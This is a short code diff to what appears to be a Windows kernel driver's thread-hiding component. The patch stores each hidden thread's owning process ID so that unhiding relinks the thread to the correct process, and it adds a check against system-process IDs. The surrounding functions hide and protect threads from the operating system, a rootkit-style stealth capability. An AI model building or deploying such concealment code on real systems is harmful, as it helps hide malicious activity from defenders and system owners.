@@ -112,6 +112,7 @@ NTSTATUS ThreadHandler::HideThread(_In_ ULONG tid) {
 	if (NT_SUCCESS(status)) {
 		thread.OriginalEntry = threadListEntry;
 		thread.Tid = tid;
+		thread.Pid = HandleToULong(owningPid);
 		status = AddHiddenThread(thread) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 	}
 	ExReleasePushLockExclusive(listLock);
@@ -150,7 +151,7 @@ NTSTATUS ThreadHandler::UnhideThread(_In_ ULONG tid) {
 	if (threadListHeadOffset == 0 || lockOffset == 0)
 		return STATUS_NOT_FOUND;
 
-	status = PsLookupProcessByProcessId(UlongToHandle(thread->Tid), &owningProcess);
+	status = PsLookupProcessByProcessId(UlongToHandle(thread->Pid), &owningProcess);
 
 	// As backup, if the previous owning process is not found attach the thread to explorer.
 	if (!NT_SUCCESS(status)) {
@@ -316,7 +317,7 @@ bool ThreadHandler::ProtectThread(_In_ ULONG tid) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 bool ThreadHandler::AddHiddenThread(_In_ HiddenThreadEntry thread) {
-	if (thread.Tid == 0 || !thread.OriginalEntry)
+	if (thread.Tid == 0 || thread.Pid <= SYSTEM_PROCESS_PID || !thread.OriginalEntry)
 		return false;
 
 	if (FindThread(thread.Tid, ThreadType::Hidden))
@@ -326,6 +327,7 @@ bool ThreadHandler::AddHiddenThread(_In_ HiddenThreadEntry thread) {
 	if (!newEntry)
 		return false;
 	newEntry->Tid = thread.Tid;
+	newEntry->Pid = thread.Pid;
 	newEntry->OriginalEntry = thread.OriginalEntry;
 	
 	AddEntry<ThreadList, HiddenThreadEntry>(&hiddenThreads, newEntry);
